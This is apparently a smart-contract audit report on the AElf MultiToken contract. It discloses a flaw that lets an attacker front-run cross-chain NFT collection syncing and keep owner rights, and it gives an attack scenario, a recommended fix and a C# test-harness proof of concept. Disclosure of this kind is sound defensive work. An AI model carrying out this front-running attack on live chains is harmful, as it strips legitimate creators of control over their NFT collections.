# Audit Report

## Title
NFT Collection Impersonation via Front-Running CrossChainCreateToken

## Summary
The `CrossChainCreateToken` function validates NFT collection existence but critically fails to verify that collection properties (IssueChainId, Issuer, Owner) match between source and destination chains. An attacker can front-run legitimate collection synchronization by creating a fake collection with the same symbol, causing the cross-chain NFT to reference the attacker's collection and granting unauthorized control over collection-owner-gated operations.

## Finding Description

The vulnerability exists in the `CrossChainCreateToken` method's inadequate NFT collection validation. While the function calls `AssertNftCollectionExist` to verify a collection exists, it **discards the return value** containing the existing collection's properties and never validates them against the cross-chain data. [1](#0-0) 

The `AssertNftCollectionExist` method returns a `TokenInfo` object containing the collection's Owner, Issuer, and IssueChainId: [2](#0-1) 

However, `CrossChainCreateToken` proceeds to create a new `TokenInfo` from the source chain data without comparing it to the existing collection. When a token already exists, the function only updates alias information and returns **without overwriting** the existing token: [3](#0-2) 

This contrasts sharply with the local NFT creation flow (`CreateNFTInfo`), which properly validates collection properties by capturing the return value and enforcing that IssueChainId and Owner match: [4](#0-3) 

**Attack Enabler:** On the main chain, anyone with a seed NFT can create NFT collections locally because `State.SideChainCreator.Value == null`: [5](#0-4) 

**Attack Scenario:**
1. Attacker monitors cross-chain transactions for NFT collection "ABC-0" being synced from side chain to main chain
2. Attacker front-runs by creating fake collection "ABC-0" on main chain using a seed NFT, with attacker as Owner
3. Legitimate `CrossChainCreateToken` is called for "ABC-0", but since collection exists, it only updates alias and preserves attacker's ownership
4. All collection-owner-gated operations now validate against attacker's fake collection

**Impact Example - SetSymbolAlias:**
The `SetSymbolAlias` function checks collection ownership: [6](#0-5) 

With a fake collection, this validates against the attacker's ownership, not the legitimate NFT owner from the source chain.

## Impact Explanation

**Authorization Bypass:** The attacker gains unauthorized control over collection-owner-gated operations (like `SetSymbolAlias`) for NFTs they don't own. These operations check `collectionTokenInfo.Owner == Context.Sender`, which validates against the fake collection's owner (attacker) rather than the legitimate owner.

**Loss of Legitimate Control:** The real NFT collection owner from the source chain cannot perform collection-owner operations on their own NFTs on the destination chain, as they fail the owner check against the attacker's fake collection.

**Cross-Chain Integrity Violation:** NFT items reference collections with mismatched IssueChainId and Owner properties, breaking the fundamental NFT hierarchy invariant where items must belong to collections from the same issuance context.

**Affected Parties:** All NFT creators synchronizing collections and items cross-chain from side chains to main chain, particularly valuable NFT collections where alias control or other collection-owner operations have economic significance.

## Likelihood Explanation

**Attacker Requirements:**
- Ability to monitor cross-chain synchronization transactions (publicly observable mempool)
- Valid seed NFT for creating collections on main chain (obtainable through legitimate purchase)
- Ability to submit transactions before legitimate synchronization completes (standard front-running technique)

**Attack Complexity:** Medium
1. Monitor for `CrossChainCreateToken` calls involving NFT collections
2. Create fake collection with same symbol using seed NFT before legitimate sync
3. Fake collection persists permanently due to no-overwrite logic

**Feasibility:** High once NFT cross-chain synchronization is active. The seed NFT cost is bounded and publicly accessible. The timing window exists during any collection sync. The attack is undetectable by on-chain validation as the fake collection appears superficially legitimate.

**Detection Difficulty:** Only off-chain comparison of collection properties across chains would reveal the discrepancy. No on-chain automated system alerts the mismatch.

## Recommendation

Modify `CrossChainCreateToken` to capture and validate the return value from `AssertNftCollectionExist` against the cross-chain data:

```csharp
public override Empty CrossChainCreateToken(CrossChainCreateTokenInput input)
{
    // ... existing validation code ...
    
    var existingCollectionInfo = AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
    
    // If collection exists, validate it matches cross-chain data
    if (existingCollectionInfo != null)
    {
        Assert(existingCollectionInfo.IssueChainId == validateTokenInfoExistsInput.IssueChainId,
            "NFT collection IssueChainId mismatch");
        Assert(existingCollectionInfo.Owner == validateTokenInfoExistsInput.Owner,
            "NFT collection Owner mismatch");
        Assert(existingCollectionInfo.Issuer == validateTokenInfoExistsInput.Issuer,
            "NFT collection Issuer mismatch");
    }
    
    // ... rest of the method ...
}
```

This ensures that if a collection already exists, its critical properties match the cross-chain data before proceeding.

## Proof of Concept

```csharp
[Fact]
public async Task NFT_Collection_FrontRun_Attack_Test()
{
    await GenerateSideChainAsync();
    await RegisterSideChainContractAddressOnMainChainAsync();
    await BootMinerChangeRoundAsync(AEDPoSContractStub, true);
    
    var nftSymbol = $"{NFTSymbolForTesting}-0";
    var attacker = SampleAccount.Accounts[1];
    
    // Step 1: Create legitimate NFT collection on side chain (by legitimate owner)
    var sideChainCreateTx = await CreateTransactionForNFTCreation(
        SideChainTokenContractStub, 
        SideChainTestKit.DefaultAccount.Address,
        nftSymbol,
        SideTokenContractAddress);
    var sideExecutedSet = await SideChainMineAsync(new List<Transaction> { sideChainCreateTx });
    sideExecutedSet.TransactionResultMap[sideChainCreateTx.GetHash()].Status
        .ShouldBe(TransactionResultStatus.Mined);
    
    // Step 2: Prepare cross-chain sync from side chain to main chain
    var sideTokenInfo = await SideChainTokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = nftSymbol });
    var validationTx = CreateTokenInfoValidationTransaction(sideTokenInfo, SideChainTokenContractStub);
    sideExecutedSet = await SideChainMineAsync(new List<Transaction> { validationTx });
    var merklePath = GetSideChainMerklePathAndRoot(validationTx, out var blockRoot);
    await IndexSideChainTransactionAsync(sideExecutedSet.Height, blockRoot, blockRoot);
    
    // Step 3: ATTACKER front-runs by creating fake collection on main chain
    var attackerStub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, attacker.KeyPair);
    var attackCreateTx = await CreateTransactionForNFTCreation(
        attackerStub,
        attacker.Address,
        nftSymbol,
        TokenContractAddress);
    var mainExecutedSet = await MineAsync(new List<Transaction> { attackCreateTx });
    mainExecutedSet.TransactionResultMap[attackCreateTx.GetHash()].Status
        .ShouldBe(TransactionResultStatus.Mined);
    
    // Verify attacker is the owner
    var fakeTokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = nftSymbol });
    fakeTokenInfo.Owner.ShouldBe(attacker.Address);
    
    // Step 4: Legitimate cross-chain sync happens (but doesn't overwrite)
    var crossChainInput = new CrossChainCreateTokenInput
    {
        FromChainId = SideChainId,
        ParentChainHeight = sideExecutedSet.Height,
        TransactionBytes = validationTx.ToByteString(),
        MerklePath = merklePath
    };
    var result = await TokenContractStub.CrossChainCreateToken.SendAsync(crossChainInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 5: Verify VULNERABILITY - attacker still owns the collection
    var finalTokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = nftSymbol });
    finalTokenInfo.Owner.ShouldBe(attacker.Address); // VULNERABILITY: Should be legitimate owner
    
    // Step 6: Attacker can now call owner-gated operations like SetSymbolAlias
    var aliasResult = await attackerStub.SetSymbolAlias.SendAsync(new SetSymbolAliasInput
    {
        Symbol = $"{nftSymbol}-1",
        Alias = "STOLEN_ALIAS"
    });
    aliasResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // SUCCESS
    
    // Step 7: Legitimate owner CANNOT call the same operation
    var legitOwnerStub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, SideChainTestKit.DefaultAccount.KeyPair);
    var legitResult = await legitOwnerStub.SetSymbolAlias.SendWithExceptionAsync(
        new SetSymbolAliasInput
        {
            Symbol = $"{nftSymbol}-2",
            Alias = "LEGIT_ALIAS"
        });
    legitResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    legitResult.TransactionResult.Error.ShouldContain("No permission");
}
```

## Notes

This vulnerability represents a critical authorization bypass in the cross-chain NFT synchronization mechanism. The root cause is the asymmetry between local NFT creation validation (which properly validates collection properties) and cross-chain NFT creation validation (which discards this information). The attack is particularly dangerous because:

1. **Permanence**: Once the fake collection is created and the legitimate sync completes, the attacker's ownership is permanently recorded
2. **Undetectability**: On-chain, the fake collection appears valid with proper structure
3. **Broad Impact**: Affects all collection-owner-gated operations, not just `SetSymbolAlias`
4. **Cross-Chain Integrity**: Violates the fundamental assumption that cross-chain synchronized tokens maintain their original properties

The fix requires capturing and validating the return value from `AssertNftCollectionExist` to ensure existing collections match the cross-chain data before proceeding.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L51-66)
```csharp
        if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
        {
            // can not call create on side chain
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
        }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L491-491)
```csharp
        AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L492-531)
```csharp
        var tokenInfo = new TokenInfo
        {
            Symbol = validateTokenInfoExistsInput.Symbol,
            TokenName = validateTokenInfoExistsInput.TokenName,
            TotalSupply = validateTokenInfoExistsInput.TotalSupply,
            Decimals = validateTokenInfoExistsInput.Decimals,
            Issuer = validateTokenInfoExistsInput.Issuer,
            IsBurnable = validateTokenInfoExistsInput.IsBurnable,
            IssueChainId = validateTokenInfoExistsInput.IssueChainId,
            ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
            Owner = validateTokenInfoExistsInput.Owner ?? validateTokenInfoExistsInput.Issuer
        };

        var isSymbolAliasSet = SyncSymbolAliasFromTokenInfo(tokenInfo);
        if (State.TokenInfos[tokenInfo.Symbol] == null)
        {
            RegisterTokenInfo(tokenInfo);
            Context.Fire(new TokenCreated
            {
                Symbol = validateTokenInfoExistsInput.Symbol,
                TokenName = validateTokenInfoExistsInput.TokenName,
                TotalSupply = validateTokenInfoExistsInput.TotalSupply,
                Decimals = validateTokenInfoExistsInput.Decimals,
                Issuer = validateTokenInfoExistsInput.Issuer,
                IsBurnable = validateTokenInfoExistsInput.IsBurnable,
                IssueChainId = validateTokenInfoExistsInput.IssueChainId,
                ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
                Owner = tokenInfo.Owner,
            });
        }
        else
        {
            if (isSymbolAliasSet &&
                validateTokenInfoExistsInput.ExternalInfo.TryGetValue(TokenContractConstants.TokenAliasExternalInfoKey,
                    out var tokenAliasSetting))
            {
                State.TokenInfos[tokenInfo.Symbol].ExternalInfo.Value
                    .Add(TokenContractConstants.TokenAliasExternalInfoKey, tokenAliasSetting);
            }
        }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L760-761)
```csharp
        Assert(collectionTokenInfo.Owner == Context.Sender || collectionTokenInfo.Issuer == Context.Sender,
            "No permission.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L17-36)
```csharp
        var nftCollectionInfo = AssertNftCollectionExist(input.Symbol);
        input.IssueChainId = input.IssueChainId == 0 ? nftCollectionInfo.IssueChainId : input.IssueChainId;
        Assert(
            input.IssueChainId == nftCollectionInfo.IssueChainId,
            "NFT issue ChainId must be collection's issue chainId");
        if (nftCollectionInfo.ExternalInfo != null && nftCollectionInfo.ExternalInfo.Value.TryGetValue(
                TokenContractConstants.NftCreateChainIdExternalInfoKey,
                out var nftCreateChainId) && long.TryParse(nftCreateChainId, out var nftCreateChainIdLong))
        {
            Assert(nftCreateChainIdLong == Context.ChainId,
                "NFT create ChainId must be collection's NFT create chainId");
        }
        else
        {
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
        }
        
        var owner = nftCollectionInfo.Owner ?? nftCollectionInfo.Issuer;
        Assert(Context.Sender == owner && owner == input.Owner, "NFT owner must be collection's owner");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L163-170)
```csharp
    private TokenInfo AssertNftCollectionExist(string symbol)
    {
        var collectionSymbol = GetNftCollectionSymbol(symbol);
        if (collectionSymbol == null) return null;
        var collectionInfo = GetTokenInfo(collectionSymbol);
        Assert(collectionInfo != null, "NFT collection not exist");
        return collectionInfo;
    }
```
